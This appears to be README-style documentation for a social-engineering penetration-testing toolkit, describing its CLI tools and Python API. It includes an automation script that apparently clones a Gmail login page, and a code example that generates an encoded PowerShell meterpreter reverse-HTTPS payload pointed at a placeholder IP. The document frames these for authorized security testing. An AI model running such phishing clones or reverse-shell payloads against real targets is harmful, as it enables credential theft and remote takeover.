# Documentation

Welcome. This repository includes interactive CLI tools and a large Python codebase. This documentation contains:

- API reference for public functions, classes, and modules extracted from source
- Usage instructions and examples for the CLI tools
- Guidance for programmatic use (importing modules and calling APIs)

## API Reference

- Start here: `api/INDEX.md`
  - Each entry links to a per-module Markdown file, mirroring the source tree under `src/` and `modules/`.
  - For modules under `src/`, the docs include direct import examples like `from src.core.setcore import <symbol>`.
  - For files under `modules/`, the docs include a one-time snippet for importing a module by file path via `importlib`.

> Notes
>
> - Public APIs are defined as top-level functions and classes that do not start with an underscore. Methods follow the same convention.
> - Signatures are best-effort reconstructions from AST; advanced annotations/defaults may be summarized as `...`.

## CLI Usage

Below are the main entry points in the repository root. These are interactive tools and should be run on a compatible, authorized test system. Many operations require root privileges and external dependencies.

### `setoolkit`

The primary interactive interface.

- Requirements: Linux/posix system, Python 3, run as root.
- First run will set up `/etc/setoolkit/set.config` from `src/core/config.baseline`.
- Launch:

```bash
sudo ./setoolkit
# or
sudo python3 setoolkit
```

- Workflow (interactive menu):
  - Choose an option (e.g., `1` for core SET features, `2` for Fast-Track, `3` for 3rd-party modules).
  - Follow prompts to configure attack vectors, listeners, or cloning options.
  - Exit with `99`.

- Tip: The help menu within SET prints `README.md` and `readme/CREDITS`.

### `seautomate`

Automates interactive menu selections for `setoolkit` using a simple script file.

- Usage:

```bash
./seautomate <path-to-automation-file>
```

- `automation-file` contents are line-delimited inputs fed to the SET menu. For example:

```text
2
2
2
https://gmail.com
2
2
443
```

- Behavior: Spawns `setoolkit` and sends each line to the interface; supports a special line `CONTROL-C-HERE` to send Ctrl+C (see script for details).

### `seproxy`

Interactive helper to write proxy settings for outbound HTTP from SET.

- Usage:

```bash
./seproxy
```

- Prompts for proxy URL and optional credentials and writes an export line to `~/.set/proxy.config`.

### `seupdate`

Updater that invokes core update routines.

- Usage:

```bash
./seupdate
```

- On non-Kali/BackBox systems, runs `git clean -fd` and `git pull` via the internal update helper.

## Programmatic Usage (Python)

The code under `src/` can be imported directly; modules under `modules/` are standalone examples/plugins that can be imported by file path.

### Import modules under `src/`

Add the repository root to `PYTHONPATH` (or run from the repo root) and import using the dotted path:

```python
# Example: use a few helpers from the core
from src.core.setcore import check_os, print_status, detect_public_ip

print_status(f"OS family: {check_os()}")
print_status(f"Detected public IPv4: {detect_public_ip()}")
```

### Import modules under `modules/` (by file path)

```python
import importlib.util
from pathlib import Path

module_file = Path('modules/ratte_module.py').resolve()
spec = importlib.util.spec_from_file_location(module_file.stem, str(module_file))
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)

# Now call public functions/classes, e.g.:
# mod.some_function(...)
```

## Examples

- Generate a PowerShell payload (example; requires external tools like Metasploit and proper configuration):

```python
from src.core.setcore import generate_powershell_alphanumeric_payload

payload = 'windows/meterpreter/reverse_https'
lhost = '192.0.2.10'  # replace with your authorized test IP
lport = '443'
encoded = generate_powershell_alphanumeric_payload(payload, lhost, lport, payload)
print(encoded)  # base64-encoded PS command
```

- Start a simple HTTP server on port 80 serving a directory (requires privileges):

```python
from src.core.setcore import start_web_server

start_web_server('/path/to/exported/site')
```

## Legal and Safety Notice

- This toolkit and its APIs are intended strictly for authorized security testing and research in environments where you have explicit permission. Misuse may violate laws and policies.
- Review `readme/User_Manual.pdf` and `README.md` for additional guidance, licensing, and changelog.
